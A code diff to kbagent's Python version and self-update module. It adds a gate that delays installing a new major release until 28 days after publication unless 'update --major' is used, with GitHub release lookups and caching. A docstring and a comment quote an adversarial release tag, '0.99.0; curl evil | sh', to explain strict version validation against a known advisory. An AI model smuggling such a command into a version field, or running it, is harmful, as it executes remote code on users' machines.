@@ -5,13 +5,18 @@ Provides version information for kbagent, which is auto-updated on startup
 version is resolved from GitHub Releases.
 """
 
+import enum
 import importlib.util
 import logging
 import os
 import shlex
 import shutil
 import subprocess
+import time
+from collections.abc import Mapping
 from dataclasses import dataclass
+from datetime import UTC, datetime
+from email.utils import parsedate_to_datetime
 from typing import Any
 
 import httpx
@@ -22,6 +27,9 @@ from ..constants import (
     ENV_UPDATE_TIMEOUT,
     KBAGENT_GITHUB_REPO,
     KBAGENT_INSTALL_SOURCE,
+    MAJOR_MIGRATION_DELAY_SECONDS,
+    NEXT_MAJOR_RECHECK_SECONDS,
+    RELEASE_LIST_PAGE_SIZE,
     UPDATE_TIMEOUT_SECONDS,
     VERSION_CHECK_TIMEOUT,
 )
@@ -55,6 +63,13 @@ class KbagentUpdatePlan:
     #: including the deferred Windows path, which is equally inapplicable.
     #: Defaulted so the existing positional constructions stay valid.
     frozen_distribution: FrozenDistribution | None = None
+    #: ``latest_version`` is of a higher major than the running one. Such an
+    #: install always goes through the deferred helper, on every OS, so the
+    #: current command finishes on the old major and no command line runs
+    #: again under the new one (#791 UP2).
+    crosses_major: bool = False
+    #: The crossing was asked for with ``kbagent update --major``.
+    major_flag: bool = False
 
 
 @dataclass(frozen=True)
@@ -62,6 +77,7 @@ class UpdatePlan:
     """Immutable explicit-update plan, prepared before the environment mutates."""
 
     kbagent: KbagentUpdatePlan
+    gated: "GatedRelease | None" = None
 
 
 def has_server_extras() -> bool:
@@ -323,93 +339,412 @@ def summarize_install_failure(output: str | None) -> str:
     return lines[-1] if lines else ""
 
 
-def _fetch_kbagent_latest_version(
-    timeout: float = VERSION_CHECK_TIMEOUT, *, include_prerelease: bool = False
-) -> str | None:
-    """Fetch latest kbagent version from GitHub releases.
+@dataclass(frozen=True)
+class NextMajorRelease:
+    """The GitHub release ``v<N+1>.0.0`` as the major gate sees it (#791 section 4.3).
 
-    Args:
-        timeout: HTTP request timeout in seconds.
-        include_prerelease: When False (default), call ``/releases/latest``
-            which GitHub explicitly defines as "the most recent non-prerelease,
-            non-draft release" -- beta tags marked with ``--prerelease`` are
-            skipped automatically by the API. When True, call ``/releases``
-            (full list), discard drafts, and pick the highest version by
-            PEP 440 ordering. This is the opt-in path behind ``kbagent
-            update --beta`` so users explicitly asking for a beta can get
-            ``0.43.0b1`` even when ``0.42.0`` is the stable.
+    ``published_at`` is the ISO-8601 UTC value GitHub returns. It is ``None``
+    when the release existed but its tag now answers 404 (deleted after T0):
+    the migration date is then unknown and the client holds the crossing.
+    """
 
-    Returns:
-        Version string like '0.16.0' (stable) or '0.43.0b1' (beta), or
-        None on failure.
+    version: str
+    release_id: int | None
+    published_at: str | None
+
+    def published_ts(self) -> float | None:
+        return _parse_iso_timestamp(self.published_at)
+
+    def migration_ts(self) -> float | None:
+        """M: ``published_at`` plus :data:`MAJOR_MIGRATION_DELAY_SECONDS`, or None."""
+        published = self.published_ts()
+        return None if published is None else published + MAJOR_MIGRATION_DELAY_SECONDS
+
+
+@dataclass(frozen=True)
+class GatedRelease:
+    """Result of :func:`fetch_gated_release`.
+
+    ``latest_version`` is what this client may install: the highest release
+    of the running major, or a release of the next major when the gate allows
+    the crossing. ``same_major_version`` is the highest release of the running
+    major; only that one is written to the startup cache, which clients older
+    than the gate also read (None on a crossing run, where it is not looked
+    up). ``latest_version`` None means the lookup failed (offline, proxy, HTTP
+    403/429): nothing is installed then.
+    """
+
+    latest_version: str | None
+    same_major_version: str | None
+    next_major: NextMajorRelease | None = None
+    #: Local time of the last read of the ``v<N+1>.0.0`` release (cache key ``checked_at``).
+    checked_at: float | None = None
+    #: The ``Date`` header of the GitHub response; None when nothing was fetched
+    #: or the header was missing (a crossing then waits).
+    server_now: float | None = None
+
+    @property
+    def crosses_major(self) -> bool:
+        return _major_of(self.latest_version) > _major_of(__version__)
+
+
+def _major_of(version: str | None) -> int:
+    """Major part of ``version``; -1 when it is missing or not PEP 440."""
+    if not version:
+        return -1
+    try:
+        return Version(version).major
+    except InvalidVersion:
+        return -1
+
+
+def _parse_iso_timestamp(value: object) -> float | None:
+    if not isinstance(value, str) or not value:
+        return None
+    try:
+        parsed = datetime.fromisoformat(value)
+    except ValueError:
+        return None
+    if parsed.tzinfo is None:
+        parsed = parsed.replace(tzinfo=UTC)
+    return parsed.timestamp()
+
+
+def _server_now(response: httpx.Response) -> float | None:
+    """The ``Date`` header of a GitHub response, so a wrong local clock does not move M.
+
+    None when the header is missing or invalid: the caller then holds the
+    crossing, and only the notice text falls back to the local clock.
+    """
+    raw = response.headers.get("Date")
+    if not raw:
+        return None
+    try:
+        parsed = parsedate_to_datetime(raw)
+    except (TypeError, ValueError, IndexError):
+        return None
+    if parsed.tzinfo is None:
+        # `-0000` ("UTC, source unknown") parses as a naive datetime.
+        parsed = parsed.replace(tzinfo=UTC)
+    return parsed.timestamp()
+
+
+@dataclass(frozen=True)
+class _Answer:
+    """One GitHub answer: status, JSON body (200 only) and its ``Date`` header."""
+
+    status: int
+    body: Any
+    server_now: float | None
+
+
+def _github_get(
+    path: str, *, timeout: float, params: dict[str, Any] | None = None
+) -> _Answer | None:
+    """GET a GitHub API path; None when no answer was read.
+
+    ``ValueError`` is caught with ``httpx.HTTPError``: httpx raises it for an
+    unsupported proxy scheme (``HTTPS_PROXY=ftp://...``) before any request,
+    and for a 200 body that is not JSON. Either way the lookup is offline.
     """
     try:
-        if include_prerelease:
-            return _fetch_kbagent_latest_prerelease(timeout)
         response = httpx.get(
-            f"https://api.github.com/repos/{KBAGENT_GITHUB_REPO}/releases/latest",
+            f"https://api.github.com/repos/{KBAGENT_GITHUB_REPO}{path}",
             timeout=timeout,
             follow_redirects=True,
             headers={"Accept": "application/vnd.github.v3+json"},
+            params=params,
         )
-        response.raise_for_status()
-        tag = response.json().get("tag_name", "")
-        # Strip a single leading 'v' (e.g. 'v0.16.0' -> '0.16.0').
-        version = tag.removeprefix("v")
-        # Validate strictly as PEP 440 before the version can flow into the
-        # install command / URL (resolve_kbagent_wheel_url /
-        # build_kbagent_upgrade_command). The old `re.match(r"\d+\.\d+\.\d+", ...)`
-        # was NOT end-anchored, so an adversarial release tag like
-        # '0.99.0; curl evil | sh' passed on its '0.99.0' prefix and reached
-        # the upgrade command (GHSA-x6cx-93j8-pgwj).
-        try:
-            Version(version)
-        except InvalidVersion:
-            logger.warning("Ignoring malformed GitHub release tag %r", tag)
-            return None
-        return version
-    except (httpx.HTTPError, KeyError, ValueError):
-        logger.debug("Failed to fetch latest kbagent version", exc_info=True)
+        body = response.json() if response.status_code == 200 else None
+    except (httpx.HTTPError, ValueError):
+        logger.debug("GitHub request %s failed", path, exc_info=True)
         return None
+    return _Answer(response.status_code, body, _server_now(response))
 
 
-def _fetch_kbagent_latest_prerelease(timeout: float) -> str | None:
-    """Fetch the highest non-draft release (incl. pre-release) from GitHub.
+def _release_version(entry: object) -> tuple[Version, str] | None:
+    """Parse a release entry's tag; None for a draft or a tag that is not PEP 440.
 
-    Pulls up to 30 most recent releases (the API's default page size, plenty
-    for kbagent's release cadence), filters drafts, parses every tag through
-    :class:`packaging.version.Version`, and returns the maximum by PEP 440
-    ordering. Pre-release detection relies on ``Version.is_prerelease`` --
-    PEP 440 normalises ``v0.43.0-beta.1`` and ``0.43.0b1`` to the same
-    canonical form, so the function works for either tag style.
-
-    Returns:
-        Highest-by-version tag (stable OR pre-release), normalised to PEP 440
-        canonical form (e.g. ``"0.43.0b1"``). None on HTTP / parse failure.
+    Validated strictly before the version can reach the install command or the
+    wheel URL: an adversarial tag like ``0.99.0; curl evil | sh`` must not pass
+    on its valid prefix (GHSA-x6cx-93j8-pgwj). Returns the canonical PEP 440
+    form (``v0.43.0-beta.1`` -> ``0.43.0b1``).
     """
-    response = httpx.get(
-        f"https://api.github.com/repos/{KBAGENT_GITHUB_REPO}/releases",
-        timeout=timeout,
-        follow_redirects=True,
-        headers={"Accept": "application/vnd.github.v3+json"},
-        params={"per_page": 30},
-    )
-    response.raise_for_status()
-    releases = response.json()
-    if not isinstance(releases, list):
+    if not isinstance(entry, dict) or entry.get("draft"):
         return None
-    best: Version | None = None
-    for entry in releases:
-        if not isinstance(entry, dict) or entry.get("draft"):
-            continue
-        tag = str(entry.get("tag_name", "")).lstrip("v")
-        try:
-            parsed = Version(tag)
-        except InvalidVersion:
-            continue
-        if best is None or parsed > best:
-            best = parsed
-    return str(best) if best is not None else None
+    tag = str(entry.get("tag_name", ""))
+    try:
+        parsed = Version(tag.removeprefix("v"))
+    except InvalidVersion:
+        logger.debug("Ignoring malformed GitHub release tag %r", tag)
+        return None
+    return parsed, str(parsed)
+
+
+def _is_stable(entry: dict[str, Any], parsed: Version) -> bool:
+    return not entry.get("prerelease") and not parsed.is_prerelease
+
+
+def _highest(candidates: list[tuple[Version, str]]) -> str | None:
+    return max(candidates)[1] if candidates else None
+
+
+@dataclass(frozen=True)
+class _ListedRelease:
+    version: Version
+    text: str
+    stable: bool
+
+
+def _read_release_list(timeout: float) -> tuple[list[_ListedRelease], float | None] | None:
+    """``GET /releases?per_page=100``: drafts and invalid tags dropped; None on failure."""
+    answer = _github_get("/releases", timeout=timeout, params={"per_page": RELEASE_LIST_PAGE_SIZE})
+    if answer is None or answer.status != 200 or not isinstance(answer.body, list):
+        return None
+    listed = []
+    for entry in answer.body:
+        parsed = _release_version(entry)
+        if parsed is not None:
+            listed.append(_ListedRelease(parsed[0], parsed[1], _is_stable(entry, parsed[0])))
+    return listed, answer.server_now
+
+
+def _of_major(
+    listed: list[_ListedRelease], major: int, *, include_prerelease: bool
+) -> list[tuple[Version, str]]:
+    return [
+        (item.version, item.text)
+        for item in listed
+        if item.version.major == major and (item.stable or include_prerelease)
+    ]
+
+
+def next_major_from_cache(
+    cache: Mapping[str, Any] | None, major: int
+) -> tuple[NextMajorRelease | None, float | None]:
+    """Read the next-major keys of the startup cache.
+
+    Returns the cached release (None when none is known) and ``checked_at``,
+    the last read of ``v<major>.0.0`` -- also kept when that read found
+    nothing, so the tag is read at most once per 24 hours. Keys written for
+    another major are ignored.
+    """
+    if not cache:
+        return None, None
+    raw_checked = cache.get("checked_at")
+    checked_at = float(raw_checked) if isinstance(raw_checked, int | float) else None
+    version = cache.get("next_major_version")
+    if version is None:
+        return None, checked_at
+    if not isinstance(version, str) or _major_of(version) != major:
+        return None, None
+    release_id = cache.get("next_major_release_id")
+    published_at = cache.get("next_major_published_at")
+    return (
+        NextMajorRelease(
+            version=version,
+            release_id=release_id if isinstance(release_id, int) else None,
+            published_at=published_at if isinstance(published_at, str) else None,
+        ),
+        checked_at,
+    )
+
+
+def next_major_cache_keys(gated: GatedRelease) -> dict[str, Any]:
+    """The next-major keys of the startup cache for ``gated``.
+
+    Only ``checked_at`` when the last read found no next major; nothing when
+    the release was never read.
+    """
+    keys: dict[str, Any] = {}
+    if gated.checked_at is not None:
+        keys["checked_at"] = gated.checked_at
+    if gated.next_major is not None:
+        keys["next_major_version"] = gated.next_major.version
+        keys["next_major_release_id"] = gated.next_major.release_id
+        keys["next_major_published_at"] = gated.next_major.published_at
+    return keys
+
+
+class _TagLookup(enum.Enum):
+    FOUND = "found"
+    MISSING = "missing"
+    FAILED = "failed"
+
+
+def _fetch_next_major(major: int, timeout: float) -> tuple[_TagLookup, NextMajorRelease | None]:
+    """Read ``GET /releases/tags/v<major>.0.0``.
+
+    Only a published, stable release counts as found. A 404 is MISSING; any
+    other failure (network, proxy, 403 or 429 rate limit, 5xx) is FAILED.
+    """
+    answer = _github_get(f"/releases/tags/v{major}.0.0", timeout=timeout)
+    if answer is None:
+        return _TagLookup.FAILED, None
+    if answer.status == 404:
+        return _TagLookup.MISSING, None
+    if answer.status != 200 or not isinstance(answer.body, dict):
+        return _TagLookup.FAILED, None
+    entry = answer.body
+    parsed = _release_version(entry)
+    if parsed is None or not _is_stable(entry, parsed[0]) or parsed[0].major != major:
+        return _TagLookup.MISSING, None
+    published_at = entry.get("published_at")
+    release_id = entry.get("id")
+    return _TagLookup.FOUND, NextMajorRelease(
+        version=parsed[1],
+        release_id=release_id if isinstance(release_id, int) else None,
+        published_at=published_at if isinstance(published_at, str) else None,
+    )
+
+
+def _merge_next_major(found: NextMajorRelease, cached: NextMajorRelease | None) -> NextMajorRelease:
+    """Apply the re-publish rule: a new release ID never shortens the 28 days.
+
+    A release with a new ID and a later ``published_at`` restarts the window
+    (that is just the new value). A new ID with an EARLIER date keeps the
+    cached, later date, so editing the releases can only postpone M.
+    """
+    if cached is None or cached.release_id is None or found.release_id == cached.release_id:
+        return found
+    new_ts, old_ts = found.published_ts(), cached.published_ts()
+    if new_ts is not None and old_ts is not None and new_ts < old_ts:
+        return NextMajorRelease(found.version, found.release_id, cached.published_at)
+    return found
+
+
+@dataclass(frozen=True)
+class _Recheck:
+    next_major: NextMajorRelease | None
+
+
+def _recheck_next_major(
+    major: int, cached: NextMajorRelease | None, timeout: float, *, seen: bool
+) -> _Recheck | None:
+    """Read ``v<major>.0.0``; None when the lookup failed.
+
+    A 404 after the release was ``seen`` (cached, or named by
+    ``/releases/latest``) means it was deleted after T0: the result holds the
+    crossing with an unknown date. A 404 before that means no next major.
+    """
+    outcome, found = _fetch_next_major(major, timeout)
+    if outcome is _TagLookup.FAILED:
+        return None
+    if found is not None:
+        return _Recheck(_merge_next_major(found, cached))
+    return _Recheck(NextMajorRelease(f"{major}.0.0", None, None) if seen else None)
+
+
+def fetch_gated_release(
+    *,
+    timeout: float = VERSION_CHECK_TIMEOUT,
+    include_prerelease: bool = False,
+    allow_major: bool = False,
+    cache: Mapping[str, Any] | None = None,
+) -> GatedRelease:
+    """Resolve the release this client may install: the major gate (#791 section 4.3).
+
+    Requests, smallest first:
+
+    * ``GET /releases/latest`` (stable channel). When it names the running
+      major, that is the same-major version. When it names a higher major
+      (after M, or a misconfigured release), ``GET /releases?per_page=100``
+      is read once for the highest stable release of the running major.
+      ``include_prerelease`` (``--beta``) reads that list instead, as the
+      pre-release path always did.
+    * ``GET /releases/tags/v<N+1>.0.0`` at most once per
+      :data:`NEXT_MAJOR_RECHECK_SECONDS` (a 404 means no next major), and
+      once more right before a crossing at M.
+    * The list again only to find the newest release of the next major for a
+      crossing, when ``/releases/latest`` does not already name it.
+
+    The next major is allowed only at or after M -- ``published_at`` of
+    ``v<N+1>.0.0`` plus 28 days, compared with the ``Date`` header of the
+    GitHub response (no header: no crossing) -- or with ``allow_major``
+    (``kbagent update --major``). ``include_prerelease`` alone never crosses.
+    Generic over the major: a 1.x client gates 2.x the same way. Any failed
+    fetch (network, proxy, HTTP 403 or 429, 5xx) installs nothing.
+
+    Args:
+        timeout: Timeout of each GitHub request, in seconds.
+        include_prerelease: Consider pre-releases (``--beta``).
+        allow_major: Allow the next major before M (``kbagent update --major``).
+        cache: The startup cache, for its next-major keys.
+    """
+    try:
+        running = Version(__version__)
+    except InvalidVersion:
+        return GatedRelease(None, None)
+    next_number = running.major + 1
+    cached_next, cached_checked = next_major_from_cache(cache, next_number)
+    offline = GatedRelease(None, None, cached_next, cached_checked)
+
+    listed: list[_ListedRelease] | None = None
+    latest: tuple[Version, str] | None = None
+    if include_prerelease:
+        read = _read_release_list(timeout)
+        if read is None:
+            return offline
+        listed, server_now = read
+    else:
+        answer = _github_get("/releases/latest", timeout=timeout)
+        if answer is None or answer.status != 200:
+            return offline
+        latest = _release_version(answer.body)
+        if latest is None:
+            return offline
+        server_now = answer.server_now
+    seen = cached_next is not None or (latest is not None and latest[0].major == next_number)
+    if listed is not None:
+        seen = seen or any(i.stable and i.version.major == next_number for i in listed)
+
+    next_major, checked_at = cached_next, cached_checked
+    checked_now = False
+    # An explicit `update --major` always reads the tag: the daily memo of a
+    # 404 must not hide a release published since.
+    stale = checked_at is None or time.time() - checked_at >= NEXT_MAJOR_RECHECK_SECONDS
+    if allow_major or stale:
+        lookup = _recheck_next_major(next_number, cached_next, timeout, seen=seen)
+        if lookup is not None:
+            next_major, checked_at, checked_now = lookup.next_major, time.time(), True
+
+    may_cross = allow_major
+    migration = next_major.migration_ts() if next_major is not None else None
+    at_migration = migration is not None and server_now is not None and server_now >= migration
+    if not allow_major and not include_prerelease and at_migration:
+        if not checked_now:
+            # Once more right before the crossing installs anything; a
+            # failed lookup holds the crossing.
+            lookup = _recheck_next_major(next_number, cached_next, timeout, seen=True)
+            if lookup is None:
+                migration = None
+            else:
+                next_major, checked_at = lookup.next_major, time.time()
+                migration = next_major.migration_ts() if next_major is not None else None
+        may_cross = migration is not None and server_now is not None and server_now >= migration
+
+    target: str | None = None
+    if may_cross and next_major is not None:
+        if latest is not None and latest[0].major == next_number:
+            target = latest[1]
+        else:
+            if listed is None:
+                read = _read_release_list(timeout)
+                listed = read[0] if read is not None else []
+            target = _highest(_of_major(listed, next_number, include_prerelease=include_prerelease))
+    if target is not None:
+        return GatedRelease(target, None, next_major, checked_at, server_now)
+
+    if latest is not None and latest[0].major <= running.major:
+        same = latest[1]
+    else:
+        if listed is None:
+            read = _read_release_list(timeout)
+            if read is None:
+                return GatedRelease(None, None, next_major, checked_at, server_now)
+            listed = read[0]
+        same = _highest(_of_major(listed, running.major, include_prerelease=include_prerelease))
+    return GatedRelease(same, same, next_major, checked_at, server_now)
 
 
 def _is_up_to_date(local: str | None, latest: str | None) -> bool | None:
@@ -431,7 +766,7 @@ def _is_up_to_date(local: str | None, latest: str | None) -> bool | None:
 
 
 def prepare_kbagent_update_plan(
-    latest_version: str | None, *, include_prerelease: bool = False
+    latest_version: str | None, *, include_prerelease: bool = False, major_flag: bool = False
 ) -> KbagentUpdatePlan:
     """Prepare the terminal self-reinstall without mutating any environment.
 
@@ -466,16 +801,49 @@ def prepare_kbagent_update_plan(
             else None
         ),
         frozen_distribution=frozen_distribution,
+        crosses_major=up_to_date is False and _major_of(latest_version) > _major_of(__version__),
+        major_flag=major_flag,
     )
 
 
-def prepare_update_plan(*, include_prerelease: bool = False) -> UpdatePlan:
+def _read_startup_cache() -> dict[str, Any] | None:
+    """The startup cache of :mod:`..auto_update`, for its next-major keys."""
+    # Lazy import: ``auto_update`` imports this module at module load.
+    try:
+        from ..auto_update import _read_cache
+
+        return _read_cache()
+    except Exception:
+        logger.debug("Could not read the version cache", exc_info=True)
+        return None
+
+
+def _register_notice(gated: GatedRelease) -> None:
+    """Keep the deprecation notice for the output layer (``version`` and ``update``)."""
+    try:
+        from ..auto_update import register_deprecation_notice
+
+        register_deprecation_notice(gated.next_major, now=gated.server_now)
+    except Exception:
+        logger.debug("Could not build the deprecation notice", exc_info=True)
+
+
+def prepare_update_plan(
+    *, include_prerelease: bool = False, allow_major: bool = False
+) -> UpdatePlan:
     """Complete the update lookup before the updater is allowed to run."""
     # Resolve the latest version first. This ordering prevents a mutated
     # kbagent environment from making a later HTTPS check fail.
-    kbagent_latest = _fetch_kbagent_latest_version(include_prerelease=include_prerelease)
+    gated = fetch_gated_release(
+        include_prerelease=include_prerelease,
+        allow_major=allow_major,
+        cache=_read_startup_cache(),
+    )
     return UpdatePlan(
-        kbagent=prepare_kbagent_update_plan(kbagent_latest, include_prerelease=include_prerelease),
+        kbagent=prepare_kbagent_update_plan(
+            gated.latest_version, include_prerelease=include_prerelease, major_flag=allow_major
+        ),
+        gated=gated,
     )
 
 
@@ -503,8 +871,11 @@ class VersionService:
         Returns:
             Structured dict with kbagent version info.
         """
-        kbagent_latest = _fetch_kbagent_latest_version(include_prerelease=include_prerelease)
+        startup_cache = _read_startup_cache()
+        gated = fetch_gated_release(include_prerelease=include_prerelease, cache=startup_cache)
+        kbagent_latest = gated.latest_version
         kbagent_up_to_date = _is_up_to_date(__version__, kbagent_latest)
+        _register_notice(gated)
 
         # Persist the freshly-fetched version to the auto-update cache so
         # the next ``kbagent <anything>`` startup hook sees it instead of
@@ -514,10 +885,19 @@ class VersionService:
         # the same machine still auto-updated to whatever stale version
         # the cache held (e.g. 0.40.3). Lazy-imported to avoid a circular
         # import: ``auto_update`` imports from this module at module load.
+        #
+        # Not under ``--beta`` (#791 UP4): a pre-release found here would be
+        # installed by the next startup of a client older than the gate. And
+        # only the running major's version: a higher major in this shared file
+        # is what such a client would install too (#791 section 4.3).
         try:
             from ..auto_update import _write_cache
 
-            _write_cache(latest_version=kbagent_latest)
+            if not include_prerelease:
+                _write_cache(
+                    latest_version=gated.same_major_version,
+                    next_major_keys=next_major_cache_keys(gated),
+                )
         except Exception:
             # Cache write is best-effort; never fail the version command
             # because the cache could not be persisted (read-only HOME,
@@ -598,7 +978,9 @@ class VersionService:
             kbagent_entry["upgrade_hint"] = frozen_distribution.upgrade_hint
         return {"kbagent": kbagent_entry}
 
-    def self_update(self, *, include_prerelease: bool = False) -> dict[str, Any]:
+    def self_update(
+        self, *, include_prerelease: bool = False, allow_major: bool = False
+    ) -> dict[str, Any]:
         """Update kbagent to the latest version.
 
         Uses ``uv tool install --force --reinstall`` from an exact release
@@ -611,6 +993,10 @@ class VersionService:
                 or ``KBAGENT_INCLUDE_PRERELEASE=1``), the version lookup
                 considers pre-release (beta / rc) releases and the install
                 command opts into resolver-level pre-release acceptance.
+            allow_major: ``kbagent update --major``: install the next major
+                before its migration date. Without it the update stays on the
+                running major until that date (#791 UP1); ``--beta`` alone
+                never crosses a major.
 
         Returns:
             Dict with the update result::
@@ -627,7 +1013,9 @@ class VersionService:
                     "message": str,     # Human-readable single-line summary
                 }
         """
-        plan = prepare_update_plan(include_prerelease=include_prerelease)
+        plan = prepare_update_plan(include_prerelease=include_prerelease, allow_major=allow_major)
+        if plan.gated is not None and not plan.kbagent.crosses_major:
+            _register_notice(plan.gated)
         kbagent_result = self._update_kbagent(plan.kbagent)
 
         return {
@@ -791,7 +1179,10 @@ class VersionService:
                 "recovery_command": plan.recovery_command,
             }
 
-        if should_defer():
+        # A major crossing is deferred on every OS (#791 UP2): this command
+        # finishes on the old major, and a running `kbagent serve` holds the
+        # install until it stops (the helper gives up after 15 minutes).
+        if should_defer() or plan.crosses_major:
             scheduled = request_deferred_update(
                 DeferredUpdateRequest(
                     from_version=old_version,
@@ -799,9 +1190,16 @@ class VersionService:
                     install_command=plan.command,
                     recovery_command=plan.recovery_command,
                     hardlink_retry_command=build_hardlink_retry_command(plan.command),
+                    major_flag=plan.major_flag,
                 )
             )
             if scheduled:
+                why = (
+                    "a new major version is installed only after this command"
+                    if plan.crosses_major
+                    else "replacing the environment while it is in use is what corrupts it on "
+                    "Windows"
+                )
                 return {
                     "planned": True,
                     "updated": False,
@@ -811,9 +1209,8 @@ class VersionService:
                     "latest_version": kbagent_latest,
                     "message": (
                         f"kbagent v{kbagent_latest} will be installed as soon as every kbagent "
-                        "process has exited -- replacing the environment while it is in use is "
-                        "what corrupts it on Windows. Close other kbagent processes; the result "
-                        "is reported on the next launch."
+                        f"process has exited -- {why}. Close other kbagent processes (a running "
+                        "kbagent serve too); the result is reported on the next launch."
                     ),
                     "recovery_command": plan.recovery_command,
                 }
